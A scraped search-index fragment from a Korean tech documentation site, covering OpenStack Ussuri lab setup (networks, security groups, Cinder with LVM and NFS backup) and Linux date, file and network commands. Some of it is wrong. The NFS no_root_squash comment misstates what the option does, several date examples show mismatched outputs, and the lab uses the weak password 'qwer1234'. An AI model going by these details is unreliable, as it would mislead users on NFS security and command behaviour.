0edec63e-cc62-4e93-8962-d0ad2df27bc8 | | prefix_length | None | | project_id | c76211c24a1f460ca67274d655d46725 | | revision_number | 0 | | segment_id | None | | service_types | | | subnetpool_id | None | | tags | | | updated_at | 2020-08-07T00:06:25Z | +----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack router add subnet router int-sub $ controller ~(keystone)\u0026gt; openstack network create \\ --provider-physical-network physnet1 \\ --provider-network-type flat --external ext +---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | admin_state_up | UP | | availability_zone_hints | | | availability_zones | | | created_at | 2020-08-07T00:06:47Z | | description | | | dns_domain | None | | id | 68e5adb0-a8c4-473b-88a9-fdaaf6f12ec2 | | ipv4_address_scope | None | | ipv6_address_scope | None | | is_default | False | | is_vlan_transparent | None | | location | cloud=\u0026#39;\u0026#39;, project.domain_id=, project.domain_name=\u0026#39;default\u0026#39;, project.id=\u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, project.name=\u0026#39;admin\u0026#39;, region_name=\u0026#39;\u0026#39;, zone= | | mtu | 1500 | | name | ext | | port_security_enabled | True | | project_id | c76211c24a1f460ca67274d655d46725 | | provider:network_type | flat | | provider:physical_network | physnet1 | | provider:segmentation_id | None | | qos_policy_id | None | | revision_number | 1 | | router:external | External | | segments | None | | shared | False | | status | ACTIVE | | subnets | | | tags | | | updated_at | 2020-08-07T00:06:47Z | +---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack subnet create ext-sub \\ --network ext --subnet-range 192.168.10.0/24 \\ --allocation-pool start=192.168.10.150,end=192.168.10.200 \\ --gateway 192.168.10.2 --dns-nameserver 8.8.8.8 +----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | allocation_pools | 192.168.10.150-192.168.10.200 | | cidr | 192.168.10.0/24 | | created_at | 2020-08-07T00:07:21Z | | description | | | dns_nameservers | 8.8.8.8 | | dns_publish_fixed_ip | None | | enable_dhcp | True | | gateway_ip | 192.168.10.2 | | host_routes | | | id | 31a92331-f102-4c4e-8c02-f97baa9eab28 | | ip_version | 4 | | ipv6_address_mode | None | | ipv6_ra_mode | None | | location | cloud=\u0026#39;\u0026#39;, project.domain_id=, project.domain_name=\u0026#39;default\u0026#39;, project.id=\u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, project.name=\u0026#39;admin\u0026#39;, region_name=\u0026#39;\u0026#39;, zone= | | name | ext-sub | | network_id | 68e5adb0-a8c4-473b-88a9-fdaaf6f12ec2 | | prefix_length | None | | project_id | c76211c24a1f460ca67274d655d46725 | | revision_number | 0 | | segment_id | None | | service_types | | | subnetpool_id | None | | tags | | | updated_at | 2020-08-07T00:07:21Z | +----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack router set router --external-gateway ext $ controller ~(keystone)\u0026gt; openstack network rbac list +--------------------------------------+-------------+--------------------------------------+ | ID | Object Type | Object ID | +--------------------------------------+-------------+--------------------------------------+ | 4e8ebe0b-60f0-485c-8696-74378068c844 | network | 68e5adb0-a8c4-473b-88a9-fdaaf6f12ec2 | +--------------------------------------+-------------+--------------------------------------+ $ controller ~(keystone)\u0026gt; wget http://cloud-images.ubuntu.com/releases/18.04/release/ubuntu-18.04-server-cloudimg-amd64.img -P /var/kvm/images $ controller ~(keystone)\u0026gt; openstack image create \u0026#34;Ubuntu1804\u0026#34; --file /var/kvm/images/ubuntu-18.04-server-cloudimg-amd64.img --disk-format qcow2 --container-format bare --public # Ubuntu18.04 이미지를 다운로드 후, 등록합니다. $ controller ~(keystone)\u0026gt; openstack security group create all-port +-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | created_at | 2020-08-07T00:10:31Z | | description | all-port | | id | 97224218-b304-4076-9645-d68092a9366a | | location | cloud=\u0026#39;\u0026#39;, project.domain_id=, project.domain_name=\u0026#39;default\u0026#39;, project.id=\u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, project.name=\u0026#39;admin\u0026#39;, region_name=\u0026#39;\u0026#39;, zone= | | name | all-port | | project_id | c76211c24a1f460ca67274d655d46725 | | revision_number | 1 | | rules | created_at=\u0026#39;2020-08-07T00:10:32Z\u0026#39;, direction=\u0026#39;egress\u0026#39;, ethertype=\u0026#39;IPv6\u0026#39;, id=\u0026#39;333de7e9-5c1b-4b2f-bb0e-2da1b878abb6\u0026#39;, updated_at=\u0026#39;2020-08-07T00:10:32Z\u0026#39; | | | created_at=\u0026#39;2020-08-07T00:10:32Z\u0026#39;, direction=\u0026#39;egress\u0026#39;, ethertype=\u0026#39;IPv4\u0026#39;, id=\u0026#39;644e18e1-4f4e-42ad-bef8-937e47254a27\u0026#39;, updated_at=\u0026#39;2020-08-07T00:10:32Z\u0026#39; | | stateful | True | | tags | [] | | updated_at | 2020-08-07T00:10:32Z | +-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack security group rule create --protocol icmp --ingress all-port +-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | created_at | 2020-08-07T00:13:31Z | | description | | | direction | ingress | | ether_type | IPv4 | | id | 27688481-047b-4fc0-948c-de109e46d7f5 | | location | cloud=\u0026#39;\u0026#39;, project.domain_id=, project.domain_name=\u0026#39;default\u0026#39;, project.id=\u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, project.name=\u0026#39;admin\u0026#39;, region_name=\u0026#39;\u0026#39;, zone= | | name | None | | port_range_max | None | | port_range_min | None | | project_id | c76211c24a1f460ca67274d655d46725 | | protocol | icmp | | remote_group_id | None | | remote_ip_prefix | 0.0.0.0/0 | | revision_number | 0 | | security_group_id | 97224218-b304-4076-9645-d68092a9366a | | tags | [] | | updated_at | 2020-08-07T00:13:31Z | +-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack security group rule create --protocol tcp --dst-port 22:22 all-port +-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ | created_at | 2020-08-07T00:13:36Z | | description | | | direction | ingress | | ether_type | IPv4 | | id | da2afd20-818a-4bfe-9017-c837b2bf30ec | | location | cloud=\u0026#39;\u0026#39;, project.domain_id=, project.domain_name=\u0026#39;default\u0026#39;, project.id=\u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, project.name=\u0026#39;admin\u0026#39;, region_name=\u0026#39;\u0026#39;, zone= | | name | None | | port_range_max | 22 | | port_range_min | 22 | | project_id | c76211c24a1f460ca67274d655d46725 | | protocol | tcp | | remote_group_id | None | | remote_ip_prefix | 0.0.0.0/0 | | revision_number | 0 | | security_group_id | 97224218-b304-4076-9645-d68092a9366a | | tags | [] | | updated_at | 2020-08-07T00:13:36Z | +-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; ssh-keygen -q -N \u0026#34;\u0026#34; $ controller ~(keystone)\u0026gt; openstack keypair create --public-key ~/.ssh/id_rsa.pub MyKey +-------------+-------------------------------------------------+ | Field | Value | +-------------+-------------------------------------------------+ | fingerprint | a3:8f:44:f6:e1:4e:da:a0:90:f1:5d:dc:6a:8b:ad:76 | | name | MyKey | | user_id | 57ce8f772e374a7c9282f2674fda1ba7 | +-------------+-------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack flavor create --ram 1024 --disk 10 --vcpus 1 m1.small +----------------------------+--------------------------------------+ | Field | Value | +----------------------------+--------------------------------------+ | OS-FLV-DISABLED:disabled | False | | OS-FLV-EXT-DATA:ephemeral | 0 | | disk | 10 | | id | dabfebd4-cd05-4cec-9567-78b8c9e3d6b6 | | name | m1.small | | os-flavor-access:is_public | True | | properties | | | ram | 1024 | | rxtx_factor | 1.0 | | swap | | | vcpus | 1 | +----------------------------+--------------------------------------+ $ controller ~(keystone)\u0026gt; openstack server create --image Ubuntu1804 --flavor m1.small --key Mykey --network int --security-group all-port Ubuntu $ controller ~(keystone)\u0026gt; openstack floating ip create ext +---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | Field | Value | +---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | created_at | 2020-08-07T00:16:15Z | | description | | | dns_domain | None | | dns_name | None | | fixed_ip_address | None | | floating_ip_address | 192.168.10.191 | | floating_network_id | 68e5adb0-a8c4-473b-88a9-fdaaf6f12ec2 | | id | 409a4724-1e13-4150-a2e1-6b3a205c4ff6 | | location | Munch({\u0026#39;cloud\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;region_name\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;zone\u0026#39;: None, \u0026#39;project\u0026#39;: Munch({\u0026#39;id\u0026#39;: \u0026#39;c76211c24a1f460ca67274d655d46725\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;domain_id\u0026#39;: None, \u0026#39;domain_name\u0026#39;: \u0026#39;default\u0026#39;})}) | | name | 192.168.10.191 | | port_details | None | | port_id | None | | project_id | c76211c24a1f460ca67274d655d46725 | | qos_policy_id | None | | revision_number | 0 | | router_id | None | | status | DOWN | | subnet_id | None | | tags | [] | | updated_at | 2020-08-07T00:16:15Z | +---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack server add floating ip Ubuntu 192.168.10.191 $ controller ~(keystone)\u0026gt;   "}),a.add({id:210,href:'/docs/system/linux/linux05/',title:"Linux 날짜",content:"Linux   Linux 날짜   Linux 날짜는 날짜 처리를 위한 명령어 입니다.      date   date는 일자, 시간을 처리하는 명령어입니다.   주요 옵션     옵션 내용     -d 원하는 일자를 지정   + 출력 포맷을 지정     사용예제  $ date +%Y%m%d 2020-11-21 # 년월일 형태  $ date +\\%Y\\%m\\%d 2020-11-21 # %를 지원하지 않는 환경(ex: crontab)에서는 특수기호로 입력  $ date +\u0026#34;%Y%m%d %H:%M:%S\u0026#34; 2020-11-21 08:46:53 # 년월일 시간 출력  $ date +%W 06 # 주차 계산  $ date +%Y-%m-%d -d \u0026#39;1 days ago\u0026#39; 2020-11-20 # 1일 전  $ date +%Y-%m-%d -d \u0026#39;+1days\u0026#39; 2020-11-22 # 1일 후  $ date +%Y-%m-%d -d \u0026#39;20190101 +1days\u0026#39; 2020-11-22 # 20201121 일자 지정후 1일 추가   "}),a.add({id:211,href:'/docs/openstack/openstacktraining/openstack-ussuri-07/',title:"OpenStack Ussuri : Cinder",content:"OpenStack Ussuri : Cinder  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | ----------------------- | L2 agent L3 agent | | NFS | | metadata agent | ----------------------- | Neutron Server | -----------------------  OpenStack Ussuri : Cinder   Cinder는 OpenStack에서 전체적인 볼륨, 디스크를 관리하는 서비스입니다. Cinder 서비스는 다른 Storage Node들과 함께 사용하도록 NFS 서버 또한 구축하여 백업 서비스를 활성하할 수 있게 구성핟록 하겠습니다. Cinder에 대한 자세한 설명은 Cinder를 참조해주세요.     Cinder service 및 User 생성  $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 cinder +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 | | domain_id | default | | enabled | True | | id | 1f9dbcbb529a45c28b5bb8b035ea277a | | name | cinder | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user cinder admin $ controller ~(keystone)\u0026gt; openstack service create --name cinderv3 --description \u0026#34;OpenStack Block Storage\u0026#34; volumev3 +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack Block Storage | | enabled | True | | id | 225ceadb699d4e79adf30769cd872fef | | name | cinderv3 | | type | volumev3 | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne volumev3 public http://controller:8776/v3/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | 6bf917232caa43eab3b83959fb19cb45 | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 225ceadb699d4e79adf30769cd872fef | | service_name | cinderv3 | | service_type | volumev3 | | url | http://controller:8776/v3/%(tenant_id)s | +--------------+-----------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne volumev3 internal http://controller:8776/v3/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | c5987fc3d9eb4fb79a2e8cf73a274936 | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 225ceadb699d4e79adf30769cd872fef | | service_name | cinderv3 | | service_type | volumev3 | | url | http://controller:8776/v3/%(tenant_id)s | +--------------+-----------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne volumev3 admin http://controller:8776/v3/%\\(tenant_id\\)s +--------------+-----------------------------------------+ | Field | Value | +--------------+-----------------------------------------+ | enabled | True | | id | eff2398584944c0fa7575d1991d725fe | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 225ceadb699d4e79adf30769cd872fef | | service_name | cinderv3 | | service_type | volumev3 | | url | http://controller:8776/v3/%(tenant_id)s | +--------------+-----------------------------------------+ # Cinder의 Endpoint를 생성합니다.    Cinder 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database cinder; $ MariaDB\u0026gt; grant all privileges on cinder.* to cinder@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on cinder.* to cinder@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Cinder 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-cinder # cinder 및 관련 모듈을 설치합니다. $ controller\u0026gt; vi /etc/cinder/cinder.conf [DEFAULT] my_ip = controller log_dir = /var/log/cinder state_path = /var/lib/cinder auth_strategy = keystone transport_url = rabbit://openstack:qwer1234@controller enable_v3_api = True [database] connection = mysql+pymysql://cinder:qwer1234@controller/cinder [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = cinder password = qwer1234 [oslo_concurrency] lock_path = $state_path/tmp $ controller\u0026gt; su -s /bin/bash cinder -c \u0026#34;cinder-manage db sync\u0026#34; $ controller\u0026gt; systemctl enable --now openstack-cinder-api openstack-cinder-scheduler # cinder DB를 임포트 시키고, 서비스를 등록합니다. $ controller\u0026gt; echo \u0026#34;export OS_VOLUME_API_VERSION=3\u0026#34; \u0026gt;\u0026gt; ~/admin_key $ controller\u0026gt; source ~/admin_key # key파일을 수정합니다. $ controller\u0026gt; firewall-cmd --add-port=8776/tcp --permanent $ controller\u0026gt; firewall-cmd --reload # 방화벽을 설정합니다.    Cinder compute node 설치  $ compute\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-cinder targetcli # cinder 및 관련 모듈을 설치합니다. $ compute\u0026gt; fdisk ... # LVM의 타입으로 파티션을 추가합니다. # cinder 이름으로 vg를 생성합니다. $ controller\u0026gt; scp /etc/cinder/cinder.conf compute:/etc/cinder/cinder.conf $ compute\u0026gt; vi /etc/cinder/cinder.conf [default] my_ip = compute ... ... glance_api_servers = http://controller:9292 enabled_backends = lvm [lvm] target_helper = lioadm target_protocol = iscsi target_ip_address = compute volume_group = cinder volume_driver = cinder.volume.drivers.lvm.LVMVolumeDriver volumes_dir = $state_path/volumes $ compute\u0026gt; vi /etc/nova/nova.conf [cinder] os_region_name = RegionOne $ compute\u0026gt; systemctl restart openstack-nova-compute $ compute\u0026gt; systemctl enable --now openstack-cinder-volume $ compute\u0026gt; vi iscsiadm.te module iscsiadm 1.0; require { type iscsid_t; class capability dac_override; } #============= iscsid_t ============== allow iscsid_t self:capability dac_override; $ compute\u0026gt; checkmodule -m -M -o iscsiadm.mod iscsiadm.te $ compute\u0026gt; semodule_package --outfile iscsiadm.pp --module iscsiadm.mod $ compute\u0026gt; semodule -i iscsiadm.pp $ compute\u0026gt; firewall-cmd --add-service=iscsi-target --permanent $ compute\u0026gt; firewall-cmd --reload # SELinux 및 방화벽을 설정합니다.    확인 $ controller ~/(keystone)\u0026gt; openstack volume service list +------------------+-------------+------+---------+-------+----------------------------+ | Binary | Host | Zone | Status | State | Updated At | +------------------+-------------+------+---------+-------+----------------------------+ | cinder-scheduler | controller | nova | enabled | up | 2020-08-07T01:29:22.000000 | | cinder-volume | compute@lvm | nova | enabled | up | 2020-08-07T01:29:22.000000 | +------------------+-------------+------+---------+-------+----------------------------+ $ controller ~/(keystone)\u0026gt; openstack volume create --size 1 test +---------------------+--------------------------------------+ | Field | Value | +---------------------+--------------------------------------+ | attachments | [] | | availability_zone | nova | | bootable | false | | consistencygroup_id | None | | created_at | 2020-08-07T01:46:06.000000 | | description | None | | encrypted | False | | id | aa07bf85-424d-478c-ae52-648ddc588465 | | migration_status | None | | multiattach | False | | name | test | | properties | | | replication_status | None | | size | 1 | | snapshot_id | None | | source_volid | None | | status | creating | | type | __DEFAULT__ | | updated_at | None | | user_id | 57ce8f772e374a7c9282f2674fda1ba7 | +---------------------+--------------------------------------+ $ controller ~/(keystone)\u0026gt; openstack volume list +--------------------------------------+------+-----------+------+-------------+ | ID | Name | Status | Size | Attached to | +--------------------------------------+------+-----------+------+-------------+ | aa07bf85-424d-478c-ae52-648ddc588465 | test | available | 1 | | +--------------------------------------+------+-----------+------+-------------+    오류가 있어 수정 중입니다 !  Cinder 백업 서비스 구성  NFS 구성참조   $ compute\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install nfs-utils # nfs-utils을 설치합니다. $ compute\u0026gt; vi /etc/exports /nfs 10.10.10.0/24(rw,no_root_squash) # ro: 마운트 된 볼륨의 데이터를 읽기만 가능 # rw: 마운트 된 볼륨에 쓰기 또한 가능 # no_root_squash: 루트 자격을 가진 사용자만 쓰기 가능 # noaccess: 디렉터리 접근 불가 $ compute\u0026gt; systemctl enable --now rpcbind nfs-server # NFC-server 서비스를 등록 및 시작합니다. $ vi /etc/cinder/cinder.conf [default] ... ... enabled_backends = lvm,nfs [nfs] volume_driver = cinder.volume.drivers.nfs.NfsDriver volume_backend_name = NFS nfs_shares_config = /etc/cinder/nfs_shares nfs_mount_point_base = $state_path/mnt_nfs # cinder.conf 파일의 nfs를 추가합니다. $ compute\u0026gt; vi /etc/cinder/nfs_shares compute:/nfs # 공유될 디렉토리를 지정합니다. $ compute\u0026gt; chmod 640 /etc/cinder/nfs_shares $ compute\u0026gt; chgrp cinder /etc/cinder/nfs_shares $ compute\u0026gt; systemctl restart openstack-cinder-volume $ compute\u0026gt; chown -R cinder. /var/lib/cinder/mnt_nfs # cinder nfs 파일의 권한을 변경하고 cinder 서비스를 재시작합니다. $ compute\u0026gt; firewall-cmd --add-service=nfs --permanent $ compute\u0026gt; firewall-cmd --reload # 방화벽을 설정합니다. $ compute\u0026gt; vi iscsiadm.te module iscsiadm 1.0; require { type iscsid_t; class capability dac_override; } #============= iscsid_t ============== allow iscsid_t self:capability dac_override; $ compute\u0026gt; checkmodule -m -M -o iscsiadm.mod iscsiadm.te $ compute\u0026gt; semodule_package --outfile iscsiadm.pp --module iscsiadm.mod $ compute\u0026gt; semodule -i iscsiadm.pp $ compute\u0026gt; systemctl restart openstack-nova-compute # SELinux를 설정하고 compute 서비스를 재시작합니다.    Cinder 백업 서비스 구성  $ compute\u0026gt; vi /etc/cinder/cinder.conf [default] ... ... backup_driver = cinder.backup.drivers.nfs.NFSBackupDriver backup_mount_point_base = $state_path/backup_nfs backup_share = compute:/var/lib/cinder-backup # ciner 백업 서비스를 활성화하기 이해 cinder.conf 파일의 설정을 추가합니다. $ compute\u0026gt; systemctl enable --now openstack-cinder-backup $ compute\u0026gt; chown -R cinder. /var/lib/cinder/backup_nfs $ cinder backup 서비스를 활성화합니다.    확인  $ controller ~(keystone)\u0026gt; openstack volume service list +------------------+-------------+------+---------+-------+----------------------------+ | Binary | Host | Zone | Status | State | Updated At | +------------------+-------------+------+---------+-------+----------------------------+ | cinder-scheduler | controller | nova | enabled | up | 2020-08-12T04:31:53.000000 | | cinder-volume | compute@lvm | nova | enabled | up | 2020-08-12T04:31:46.000000 | | cinder-volume | compute@nfs | nova | enabled | up | 2020-08-12T04:31:46.000000 | +------------------+-------------+------+---------+-------+----------------------------+ $ controller ~(keystone)\u0026gt; $ controller ~(keystone)\u0026gt; $ controller ~(keystone)\u0026gt; $ controller ~(keystone)\u0026gt; "}),a.add({id:212,href:'/docs/system/linux/linux06/',title:"Linux 파일처리",content:"Linux   Linux 파일처리   Linux 파일처리는 각 파일들을 읽거나, 데이터를 수정하는 데 주로 사용됩니다.      file   파일의 타입을 확인합니다. 텍스트파일, 실행파일, 아카이브 파일 등의 파일 타입을 확인합니다.   주요 옵션     옵션 내용     -z 파일이 압축되어 있는 경우 압축되기 전의 파일 타입을 확인        head   head는 파일의 앞 부분을 출력하는 명령어입니다.   주요 옵션     옵션 내용     -n [라인번호] 지정한 라인번호까지 출력        less, more**    텍스트 파일을 열람하는 명령어입니다.\n  화면을 이동하는 명령어는 vi 편집기와 동일하며, less가 more보다 화면을 자유롭게 이동할 수 있는 기능을 가지고 있습니다.\n   주요 옵션     옵션 내용     -N 라인번호를 표시        split   split는 파일을 분할하는 명령어로, 파일을 지정한행의 길이나 사이즈로 분할시키는 명령어입니다.   주요 옵션     옵션 내용     -l 100 100라인 단위로 분할, 기본 값을 100   -d 숫자로 된 이름의 파일로 분할   -a 분할된 파일 딜리미터의 크기를 설정     사용예제  $ split -l 100 origin.txt xaa xab xac # origintxt 파일을 100줄 단위로 분할합니다.  $ split -l 100 -d origin.txt x01 x02 x03 # origintxt 파일을 100줄 단위로 나누는데, 파일이름을 숫자형식으로 분할합니다.  $ split -l 100 -d -a 4 origin.txt x0001 x0002 x0003 # origintxt 파일을 100줄 단위로 나누는데, 파일이름을 숫자형식으로 하고, 파일이름의 딜리미터 크기는 4입니다.      tail   tail은 head 반대로 파일의 뒷부분을 출력하는 명령어입니다.   주요 옵션     옵션 내용     -n [라인번호] 지정한 라인번호까지 출력   -f 파일에 데이터가 추가될 때까지 대기하면서 추가되면 계속 출력     사용예제    상태 내용              xxd    xxd는 파일의 헥사 덤프를 확인하느 명령어입니다.\n  파일을 16진수 또는 2진수 형태로 확인할 수 있습니다.\n   주요 옵션     옵션 내용     -b 2진수로 표현     "}),a.add({id:213,href:'/docs/system/linux/linux07/',title:"Linux Network",content:"Linux   Linux Network 처리    Linux 상의 Network는 OS와 함께 핵심요소 중 하나입니다.\n  Network 명령어를 통해 보다 편리하게 Network 요소들의 확인 및 관리가 가능합니다.\n      curl    curl은 여러 프로토콜을 이용하여 네트워크 명령을 전송하는 도구로, 지원되는 프로토콜 (HTTP,HTTPS,FTP,FTPS,SCP,SFTP,TFTP,DICT,TELNET,LDAP 또는 FILE) 중 하나를 사용하여 서버 간의 데이터를 전송할 수 있습니다.\n  프록시 지원, 사용자 인증, FTP 업로드, HTTP 캐시, SSL 연결, 파일 전송 이력 등과 같은 유용한 기능을 제공합니다.\n   주요 옵션     옵션 내용     -o [파일명] [파일경로] 지정한 파일명으로 파일 다운로드   -O [경로] 파일 이름으로 다운로드   -s 추가 정보없이 처리   -l 헤더 정보만 확인   -i 헤더정보 확인   -H 헤더 정보 전달   -G 파리미터 전달   -X 메소드 타입 설정(기본 GET), POST, DELETE   -d 전달 데이터, POST 타입일 때 json 형태로 입력하면 데이터에 전달   -v 상세출력     사용예제  $ curl -O http://apache.mirror.cdnetworks.com/oozie/4.3.1/oozie-4.3.1.tar.gz % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2374k 100 2374k 0 0 23.4M 0 --:--:-- --:--:-- --:--:-- 37.4M # 파일 다운로드  $ curl -o oozie.tar.gz http://apache.mirror.cdnetworks.com/oozie/4.3.1/oozie-4.3.1.tar.gz % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2374k 100 2374k 0 0 35.6M 0 --:--:-- --:--:-- --:--:-- 38.6M # 파일 이름을 지정하여 다운로드  $ curl -so oozie.tar.gz http://apache.mirror.cdnetworks.com/oozie/4.3.1/oozie-4.3.1.tar.gz # s 옵션을 이용하면 전송 속도와 같은 부가 정보가 나타나지 않음 $ curl -i http://127.0.0.1/latest/dynamic/instance-identity/document HTTP/1.0 200 OK Content-Type: text/plain Accept-Ranges: bytes ETag: \u0026#34;3177614890\u0026#34; Last-Modified: Wed, 18 Sep 2019 04:09:27 GMT Content-Length: 505 Connection: close Date: Wed, 18 Sep 2019 04:13:18 GMT Server: EC2ws # i 옵션으로 헤더 정보 확인  $ curl -H \u0026#34;Content-Type: application/json\u0026#34; http://127.0.0.1/latest/dynamic/instance-identity/document # H 옵션으로 헤더 전달  $ curl -G http://127.0.0.1/latest/dynamic/instance-identity/document?a=b # GET 방식 파라미터 전달  $ curl http://127.0.0.1/latest/dynamic/instance-identity/document -d a=b $ curl http://127.0.0.1/latest/dynamic/instance-identity/document -d \u0026#34;a=b\u0026amp;c=d\u0026#34; # POST 방식 파라미터 전달 $ curl -X \u0026#34;DELETE\u0026#34; http://127.0.0.1/latest/dynamic/instance-identity/document # 메소드 변경 $ curl -X POST -d \u0026#34;{\\\u0026#34;key\\\u0026#34;:\\\u0026#34;val\\\u0026#34;}\u0026#34; http://127.0.0.1 # POST 형식 데이터 전달      ifconfig   네트워크 인터페이스를 확인하고 설정하는 명령어입니다.   사용예제 $ ifconfig eth0 Link encap:Ethernet HWaddr 02:DA:18:B7:C6:F7 inet addr:192.168.0.3 Bcast:192.168.0.255 Mask:255.255.255.0 inet6 addr: Scope:Link UP BROADCAST RUNNING MULTICAST MTU:9001 Metric:1 RX packets:1629317 errors:0 dropped:0 overruns:0 frame:0 TX packets:1649688 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:472859354 (450.9 MiB) TX bytes:238864810 (227.7 MiB) Interrupt:155 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:6834 errors:0 dropped:0 overruns:0 frame:0 TX packets:6834 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:8946461 (8.5 MiB) TX bytes:8946461 (8.5 MiB) # 네트워크 인터페이스의 정보 확인  $ ifconfig eth0 192.168.0.1 broadcast 192.168.0.255 netmask 255.255.255.0 # 네트워크 인터페이스 설정 - IP 주소 설정      lynx   lynx는 텍스트 기반의 웹 브라우저입니다.   사용예제  $ lynx http://www.naver.com # 텍스트 기반으로 네이버에 접속     netstat   netstat은 네트워크 인터페이스, 경로 등의 네트워크 정보를 출력하는 명령어로, 네트워크 접속 정보, 포트 정보 등을 출력합니다.   주요 옵션     옵션 내용     -a 경로 테이블을 함께 출력   -n 네트어크 주소를 숫자(IP)로 출력   -i 네트워크 접속 상태를 출력   -o 타이머 정보를 출력   -l LISTENING 상태의 정보만 출력     출력정보    상태 정보     Proto 소켓이 사용하는 프로토콜의 정보(tcp, udp, raw)   Recv-Q 소켓이 사용자 프로그램으로 전달되지 않은 바이트 사이즈   Send-Q 원격지에 전달하지 않은 바이트 사이즈   Local Address 로컬의 아이피와 포트 번호   Foreign Address 원격지의 아이피와 포트 번호   State 연결 상태     연결상태정보    상태 내용     ESTABLISHED 소켓이 연결되어진 상태   SYS_SEND 소켓이 연결을 시동 중임   SYS_RECV 네트워크 연결 요청을 받음   FIN_WAIT1 소켓이 종료되고, 커넷션을 종료 중   FIND_WAIT2 커넥션이 종료되고, 소켓이 원격지의 연결 종료를 대기 중   TIME_WAIT 소켓은 네트워크에 여전히 남아있는 패킷을 처리하기 위해 대기 중   CLOSED 소켓이 사용되지 않는 중   CLOSE_WAIT 원격지의 연결이 종료되고, 소켓이 닫히는 것을 대기중   LAST_ACK 원격지 연결이 종료되고, 소켓이 닫혔음, 승인 대기 중   LISTEN 소켓이 연결을 수신하고 있음, -l -a 옵션이 없으면 출력되지 않음   CLOSING 소켓이 종료되었지만, 데이터가 전송 중임   UNKNOWN 상태를 알 수 없음        nslookup   nslooup은 도메인 서버에 호스트명을 검색하기 위한 명령어입니다.   사용예제  $ nslookup www.naver.com Server: 10.20.30.60 Address: 10.20.30.60#53 Non-authoritative answer: www.naver.com canonical name = www.naver.com.nheos.com. Name: www.naver.com.nheos.com Address: 125.209.222.142 Name: www.naver.com.nheos.com Address: 210.89.160.88     scp   scp는 SSH 통신을 기반으로 파일을 전송하는 프로토콜로 Secure Copy의 약자입니다.   주요 옵션     옵션 내용     -r 복수의 파일을 전송할 때 